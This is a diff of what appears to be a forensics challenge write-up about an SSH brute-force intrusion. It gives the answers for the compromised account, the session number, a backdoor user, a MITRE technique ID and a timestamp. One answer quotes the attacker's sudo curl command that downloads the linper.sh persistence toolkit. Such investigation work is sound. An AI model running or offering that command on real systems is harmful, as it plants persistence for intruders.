@@ -32,7 +32,7 @@ We can see after lots of attempt password accepted for user root.
 ### Answer:- root
 
 
-### 4). SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?
+### 3). SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?
 
 ![answer](Q4.png)
 
@@ -41,7 +41,7 @@ We can see from above screenshot that session number 37 was assigned to the user
 ### Answer:- 37
 
 
-### 5). The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?
+### 4). The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?
 
 ![answer](Q5.png)
 
@@ -50,18 +50,18 @@ We can see that attacker installed linux persistence toolkit linper.sh and also 
 ### Answer:- cyberjunkie
 
 
-### 6). What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?
+### 5). What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?
 
 I searched in internet to find persistence techniques releated account creation
 
 ![answer](Q6.png)
 
-we can see that attacker used T1136.001 comes under local account creation 
+we can see that attacker used T1136.001 comes under local account creation.
 
 ### Answer:- T1136.001
 
 
-### 7). What time did the attacker's first SSH session end according to auth.log?
+### 6). What time did the attacker's first SSH session end according to auth.log?
 
 ![answer](Q7.png)
 
@@ -70,9 +70,9 @@ We can see at Mar 6 06:37:24 ssh session ended
 ### Answer:- 2024-03-06 06:37:24
 
 
-### 8).The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?
+### 7).The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?
 
-As we saw early that attacker used linper.sh to utilize their higher privileges 
+As we saw early that attacker used linper.sh to utilize their higher privileges.
 
 ### Answer:- /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
 
